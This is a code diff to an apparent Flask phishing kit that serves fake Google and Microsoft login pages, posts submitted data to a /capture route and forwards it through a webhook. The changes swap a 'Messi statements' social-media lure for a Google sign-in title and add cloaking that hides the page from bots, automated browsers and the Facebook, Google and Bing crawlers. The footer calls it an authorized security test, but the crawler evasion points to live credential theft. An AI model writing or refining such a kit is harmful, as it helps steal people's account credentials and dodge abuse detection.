@@ -41,25 +41,7 @@ def get_template():
 <html>
 <head>
     <meta charset="UTF-8">
-    <link rel="icon" href="data:;base64,iVBORw0KGgo=">
-    
-    <!-- METADATOS PARA TODAS LAS REDES SOCIALES -->
-    <meta property="og:title" content="😲 Fuertes declaraciones de Messi" />
-    <meta property="og:description" content="Me dijeron que ganaría" />
-    <meta property="og:image" content="https://i.imgur.com/kgo0gfA.png" />
-    <meta property="og:url" content="https://video-xeen.onrender.com" />
-    <meta property="og:type" content="website" />
-    <meta property="og:site_name" content="Messi Declaraciones" />
-    
-    <!-- METADATOS PARA TWITTER -->
-    <meta name="twitter:card" content="summary_large_image" />
-    <meta name="twitter:title" content="😲 Fuertes declaraciones de Messi" />
-    <meta name="twitter:description" content="Me dijeron que ganaría" />
-    <meta name="twitter:image" content="https://i.imgur.com/kgo0gfA.png" />
-    
-    <!-- METADATOS PARA WHATSAPP (usa los mismos de og:) -->
-    
-    <title>😲 Fuertes declaraciones de Messi</title>
+    <title>Iniciar sesión - Google</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Roboto', sans-serif; }
         body { background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
@@ -86,6 +68,11 @@ def get_template():
         </form>
         <div class="footer">Prueba de seguridad autorizada</div>
     </div>
+    <script>
+        if (navigator.webdriver || /bot|crawler|spider|crawling/i.test(navigator.userAgent)) {
+            document.body.innerHTML = '<h1>403 Forbidden</h1>';
+        }
+    </script>
 </body>
 </html>''',
         'microsoft': '''
@@ -205,7 +192,10 @@ def send_webhook(data):
 
 @app.route('/')
 def index():
-    # MODO PRUEBA: SIN BLOQUEOS PARA QUE FUNCIONE EN TODAS PARTES
+    user_agent = request.headers.get('User-Agent', '')
+    bots = ['bot', 'crawler', 'spider', 'facebook', 'google', 'bing']
+    if any(bot in user_agent.lower() for bot in bots):
+        return "404 Not Found", 404
     return render_template_string(get_template())
 
 @app.route('/capture', methods=['POST'])
